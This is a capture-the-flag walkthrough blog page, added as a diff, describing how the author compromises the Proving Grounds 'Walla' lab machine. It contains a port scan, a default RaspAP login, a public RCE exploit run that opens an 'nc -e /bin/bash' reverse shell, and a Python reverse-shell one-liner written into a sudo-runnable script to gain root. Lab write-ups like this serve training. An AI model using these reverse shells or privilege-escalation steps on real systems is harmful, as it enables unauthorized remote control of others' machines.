@@ -1,0 +1,553 @@
+<!DOCTYPE html>
+<html lang="en">
+<!-- Beautiful Jekyll 5.0.0 | Copyright Dean Attali 2020 -->
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  
+
+  
+
+  <title>Proving Grounds - Walla</title>
+
+  
+  <meta name="author" content="Marius Žukovskis">
+  
+
+  <meta name="description" content="CTF Walkthrough">
+
+  
+
+  
+
+  
+  <link rel="alternate" type="application/rss+xml" title="Home" href="http://localhost:4000/feed.xml">
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+    
+      
+  <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+
+
+    
+      
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.min.css">
+
+
+    
+      
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic">
+
+
+    
+      
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800">
+
+
+    
+  
+
+  
+    
+      <link rel="stylesheet" href="/assets/css/bootstrap-social.css">
+    
+      <link rel="stylesheet" href="/assets/css/beautifuljekyll.css">
+    
+  
+
+  
+
+  
+  
+  
+
+  
+
+  
+  <meta property="og:site_name" content="Home">
+  <meta property="og:title" content="Proving Grounds - Walla">
+  <meta property="og:description" content="CTF Walkthrough">
+
+  
+  <meta property="og:image" content="http://localhost:4000/assets/img/walla/walla.jpg">
+  
+
+  
+  <meta property="og:type" content="article">
+  <meta property="og:article:author" content="Marius Žukovskis">
+  <meta property="og:article:published_time" content="2022-11-12T00:00:00+02:00">
+  <meta property="og:url" content="http://localhost:4000/2022-11-12-PG-Walla/">
+  <link rel="canonical" href="http://localhost:4000/2022-11-12-PG-Walla/">
+  
+
+  
+  <meta name="twitter:card" content="summary_large_image">
+  
+  <meta name="twitter:site" content="@">
+  <meta name="twitter:creator" content="@">
+
+  <meta property="twitter:title" content="Proving Grounds - Walla">
+  <meta property="twitter:description" content="CTF Walkthrough">
+
+  
+  <meta name="twitter:image" content="http://localhost:4000/assets/img/walla/walla.jpg">
+  
+
+  
+
+
+  
+
+  
+
+</head>
+
+
+<body>
+
+  
+
+
+  <nav class="navbar navbar-expand-xl navbar-light fixed-top navbar-custom top-nav-regular"><a class="navbar-brand" href="http://localhost:4000/">Home</a><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false" aria-label="Toggle navigation">
+    <span class="navbar-toggler-icon"></span>
+  </button>
+
+  <div class="collapse navbar-collapse" id="main-navbar">
+    <ul class="navbar-nav ml-auto">
+          <li class="nav-item">
+            <a class="nav-link" href="/posts">Posts</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="/whoami">About Me</a>
+          </li></ul>
+  </div>
+
+  
+
+  
+
+</nav>
+
+
+
+
+
+  <!-- TODO this file has become a mess, refactor it -->
+
+
+
+
+
+
+  <div id="header-big-imgs" data-num-img=1
+    
+    
+    
+      
+      data-img-src-1="http://localhost:4000/assets/img/walla/walla.jpg"
+    
+    
+    
+  ></div>
+
+
+<header class="header-section has-img">
+
+<div class="big-img intro-header">
+  <div class="container-md">
+    <div class="row">
+      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
+        <div class="post-heading">
+          <h1>Proving Grounds - Walla</h1>
+          
+            
+              <h2 class="post-subheading">CTF Walkthrough</h2>
+            
+          
+
+          
+            <span class="post-meta">Posted on November 12, 2022</span>
+            
+            
+          
+        </div>
+      </div>
+    </div>
+  </div>
+  <span class='img-desc'></span>
+</div>
+
+<div class="intro-header no-img">
+  <div class="container-md">
+    <div class="row">
+      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
+        <div class="post-heading">
+          <h1>Proving Grounds - Walla</h1>
+          
+            
+              <h2 class="post-subheading">CTF Walkthrough</h2>
+            
+          
+
+          
+            <span class="post-meta">Posted on November 12, 2022</span>
+            
+            
+          
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+</header>
+
+
+
+
+
+<div class=" container-md ">
+  <div class="row">
+    <div class=" col-xl-8 offset-xl-2 col-lg-10 offset-lg-1 ">
+
+      
+
+      
+
+      <article role="main" class="blog-post">
+        <p>Intermediate rated OSCP like box found on Proving Grounds. Lets check it out.</p>
+
+<h3 id="enumeration">Enumeration</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ rustscan -a 192.168.209.97 -- -sC -sV | tee nmap
+
+PORT      STATE SERVICE    REASON  VERSION
+22/tcp    open  ssh        syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+23/tcp    open  telnet     syn-ack Linux telnetd
+25/tcp    open  smtp       syn-ack Postfix smtpd
+| ssl-cert: OpenSSL required to parse certificate.
+| -----BEGIN CERTIFICATE-----
+| MIICzTCCAbWgAwIBAgIUSjsFHwJii76XBfqWrgTLj7nupXgwDQYJKoZIhvcNAQEL
+| BQAwEDEOMAwGA1UEAwwFd2FsbGEwHhcNMjAwOTE3MTgyNjM2WhcNMzAwOTE1MTgy
+| NjM2WjAQMQ4wDAYDVQQDDAV3YWxsYTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
+| AQoCggEBAOwqF+jjwFmrSmgMiDEP1C3Adi9w1nrHCw8pFunsf2BnG4tRF3Xj2blV
+| d5+CaCqmsiADAjFGXNREudaCvYKvw9ctU83dKw8khjho9Q+vm6AEMgS78uQNhQp3
+| uXFkQVboMxYZdtxGs2/JkE0S52qYXScSJWer8uEon7qAkLgRJ1gQQHlqZ44ekmdt
+| wPaQIu5IYWIeMYiLHb3Ivvk6esj/01NpaNmTNyljF2LxdEJaRjYYEMPqvS2Z5Dzd
+| QL+fIWkeINwvWl+J4rkZA5xnLnOo08BG4MtGHAi0b2+bJ4fGT4fnrgoXoG6D9vIN
+| jcxFhgScgAiA+ifARtuoKjWMukDiChUCAwEAAaMfMB0wCQYDVR0TBAIwADAQBgNV
+| HREECTAHggV3YWxsYTANBgkqhkiG9w0BAQsFAAOCAQEAmzn/Ujcmz5o+qRXzL2ZR
+| 60yEhjRd3kRaU4im8917uvzt7tZ/ELIGbCEEaNfhNOvyqDAtRPZC7U1m94baUqr+
+| 741Er3x+NPR8A0aNn4tYq6SnD66XNeVecQfplg6uTjVCChO1iEAFXo1ETUjP6WV6
+| Am8XspbmjffTPLWei0uw+qXfOL9TFu8sIFbhr0+UmV6ZpXNc+yoqGUlKFUTcHye0
+| OZHrz6yNf+hUnMWBY6wWUB5SlpT4Onrnm6SWBU7rAD3kvLAsmpQHI38x5NTAxRWZ
+| m5NUiiBnSYTwXytEvzHdqgkNxKPQDKnfS8D9oeVFjtM22TNKI8ytVFV+SQ0plPA+
+| tQ==
+|_-----END CERTIFICATE-----
+|_smtp-commands: walla, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
+|_ssl-date: TLS randomness does not represent time
+53/tcp    open  tcpwrapped syn-ack
+422/tcp   open  ssh        syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+8091/tcp  open  http       syn-ack lighttpd 1.4.53
+|_http-server-header: lighttpd/1.4.53
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=RaspAP
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+42042/tcp open  ssh        syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+Service Info: Host:  walla; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<h3 id="exploitation">Exploitation</h3>
+
+<p>Looking into Nmap results for port 8091, we can see it’s potentially running RaspAP. Googling  RasAP default login I managed to get credentials <strong>admin:secret</strong> to the web application.</p>
+
+<p><img src="/assets/img/walla/webpage.png" alt="alt text" /></p>
+
+<p>Also did a Searchsploit search for this web application and I found an exploit for RaspAP 2.6.6</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ searchsploit raspap
+------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                 |  Path
+------------------------------------------------------------------------------- ---------------------------------
+RaspAP 2.6.6 - Remote Code Execution (RCE) (Authenticated)                     | php/webapps/50224.py
+------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results                     
+</code></pre></div></div>
+
+<p>Unfortunately RaspAP version is v2.5. Doing a quick google search I found <a href="https://github.com/gerbsec/CVE-2020-24572-POC/blob/main/exploit.py">CVE-2020-24572</a> which does the job as well.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ python exploit.py 192.168.209.97 8091 192.168.49.209 8091 secret 1      
+[!] Using Reverse Shell: nc -e /bin/bash 192.168.49.209 8091
+[!] Sending activation request - Make sure your listener is running . . .
+[&gt;&gt;&gt;] Press ENTER to continue . . .
+
+[!] You should have a shell :)
+
+[!] Remember to check sudo -l to see if you can get root through /etc/raspap/lighttpd/configport.sh
+</code></pre></div></div>
+
+<p>Got a low privilege shell.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ nc -nvlp 8091
+listening on [any] 8091 ...
+connect to [192.168.49.209] from (UNKNOWN) [192.168.209.97] 44184
+python3 -c "import pty;pty.spawn('/bin/bash')"
+www-data@walla:/var/www/html/includes$ whoami
+whoami
+www-data
+www-data@walla:/var/www/html/includes$ 
+</code></pre></div></div>
+
+<p>Walter’s home directory contains local.txt and wifi_reset.py script.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@walla:/home/walter$ ls -la
+ls -la
+total 28
+drwxr-xr-x 2 www-data www-data 4096 Sep 17  2020 .
+drwxr-xr-x 6 root     root     4096 Sep 17  2020 ..
+-rw-r--r-- 1 walter   walter    220 Apr 18  2019 .bash_logout
+-rw-r--r-- 1 walter   walter   3526 Apr 18  2019 .bashrc
+-rw-r--r-- 1 walter   walter    807 Apr 18  2019 .profile
+-rw------- 1 www-data walter     33 Nov 12 08:28 local.txt
+-rw-r--r-- 1 root     root      251 Sep 17  2020 wifi_reset.py
+</code></pre></div></div>
+
+<h3 id="privilege-escalation">Privilege escalation</h3>
+
+<p>Did a check  what www-user can run with sudo</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@walla:/tmp$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on walla:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on walla:
+    (ALL) NOPASSWD: /sbin/ifup
+    (ALL) NOPASSWD: /usr/bin/python /home/walter/wifi_reset.py
+    (ALL) NOPASSWD: /bin/systemctl start hostapd.service
+    (ALL) NOPASSWD: /bin/systemctl stop hostapd.service
+    (ALL) NOPASSWD: /bin/systemctl start dnsmasq.service
+    (ALL) NOPASSWD: /bin/systemctl stop dnsmasq.service
+    (ALL) NOPASSWD: /bin/systemctl restart dnsmasq.service
+</code></pre></div></div>
+
+<p>Looks like we can run wifi_reset.py with sudo.  I added a Python reverse shell to the script.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@walla:/home/walter$ cat &gt; wifi_reset.py &lt;&lt; EOF
+cat &gt; wifi_reset.py &lt;&lt; EOF
+&gt; import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.209",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
+&lt;eno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
+&gt; EOF
+EOF
+</code></pre></div></div>
+
+<p>Ran the script with sudo, and got the shell !</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@walla:/home/walter$ sudo /usr/bin/python /home/walter/wifi_reset.py
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ nc -nvlp 80                                                                        
+listening on [any] 80 ...
+connect to [192.168.49.209] from (UNKNOWN) [192.168.209.97] 40914
+# cd /root
+cd /root
+# ls -la
+ls -la
+total 20
+drwx------  2 root root 4096 Nov 12 08:27 .
+drwxr-xr-x 18 root root 4096 Sep 17  2020 ..
+lrwxrwxrwx  1 root root    9 Sep 17  2020 .bash_history -&gt; /dev/null
+-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root   33 Nov 12 08:28 proof.txt
+</code></pre></div></div>
+
+<p>GG fun and straightforward lab.</p>
+
+      </article>
+
+      
+        <div class="blog-tags">
+          <span>Tags:</span>
+          
+            <a href="/tags#ctf">ctf</a>
+          
+            <a href="/tags#proving grounds">proving grounds</a>
+          
+            <a href="/tags#pg">pg</a>
+          
+        </div>
+      
+
+      
+
+      
+        <!-- Check if any share-links are active -->
+
+
+
+
+<section id = "social-share-section">
+  <span class="sr-only">Share: </span>
+
+  
+    <a href="https://twitter.com/intent/tweet?text=Proving+Grounds+-+Walla&url=http%3A%2F%2Flocalhost%3A4000%2F2022-11-12-PG-Walla%2F"
+      class="btn btn-social-icon btn-twitter" title="Share on Twitter">
+      <span class="fab fa-fw fa-twitter" aria-hidden="true"></span>
+      <span class="sr-only">Twitter</span>
+    </a>
+  
+
+  
+    <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2F2022-11-12-PG-Walla%2F"
+      class="btn btn-social-icon btn-facebook" title="Share on Facebook">
+      <span class="fab fa-fw fa-facebook" aria-hidden="true"></span>
+      <span class="sr-only">Facebook</span>
+    </a>
+  
+
+  
+    <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2F2022-11-12-PG-Walla%2F"
+      class="btn btn-social-icon btn-linkedin" title="Share on LinkedIn">
+      <span class="fab fa-fw fa-linkedin" aria-hidden="true"></span>
+      <span class="sr-only">LinkedIn</span>
+    </a>
+  
+
+  
+
+  
+
+</section>
+
+
+
+      
+
+      <ul class="pagination blog-pager">
+        
+        <li class="page-item previous">
+          <a class="page-link" href="/2022-11-08-PG-Depreciated/" data-toggle="tooltip" data-placement="top" title="Proving Grounds - Depreciated">&larr; Previous Post</a>
+        </li>
+        
+        
+      </ul>
+      
+  
+  
+  
+
+  
+
+
+  
+
+  
+
+
+
+    </div>
+  </div>
+</div>
+
+
+  <footer>
+  <div class="container-md beautiful-jekyll-footer">
+    <div class="row">
+      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
+      <ul class="list-inline text-center footer-links"><li class="list-inline-item">
+    <a href="mailto:marius@zukovskis.lt" title="Email me">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">Email me</span>
+   </a>
+  </li><li class="list-inline-item">
+    <a href="https://github.com/zukoma" title="GitHub">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">GitHub</span>
+   </a>
+  </li></ul>
+
+      
+      <p class="copyright text-muted">
+      
+        Marius Žukovskis
+        &nbsp;&bull;&nbsp;
+      
+      2022
+
+      
+
+      
+
+      
+
+      </p>
+      <p class="theme-by text-muted">
+        Powered by
+        <a href="https://beautifuljekyll.com">Beautiful Jekyll</a>
+      </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+  
+  
+    
+  <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha256-4+XzXVhsDmqanXGHaHvgh1gMQKX40OUvDEBTu8JcmNs=" crossorigin="anonymous"></script>
+
+
+  
+    
+  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+
+
+  
+    
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
+
+
+  
+
+
+
+  
+    <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
+    
+      <script src="/assets/js/beautifuljekyll.js"></script>
+    
+  
+
+
+
+
+
+
+
+
+
+</body>
+</html>
